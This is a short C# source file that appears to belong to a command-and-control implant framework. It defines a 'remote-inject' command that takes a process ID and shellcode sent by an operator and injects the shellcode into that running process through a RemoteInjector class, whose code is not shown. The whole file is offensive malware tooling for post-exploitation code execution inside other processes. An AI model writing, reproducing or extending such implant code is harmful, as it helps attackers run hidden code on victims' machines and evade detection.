using SharedArsenal.Internal;
using Knight.Models.Raven;


namespace Knight.Commands
{
    public class ShellcodeRemoteInject : KnightCommand
    {
        public override string Name => "remote-inject";

        public override string Execute(TaskMessage task)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                return "Failed to parse PID";
            }

            var injector = new RemoteInjector();
            //var success = injector.Inject(task.FileBytes, pid);
            var success = injector.Inject(task.File, pid);

            if (success)
            {
                return "Shellcode injected";
            }
            else
            {
                return "Failed to inject";
            }
        }
    }
}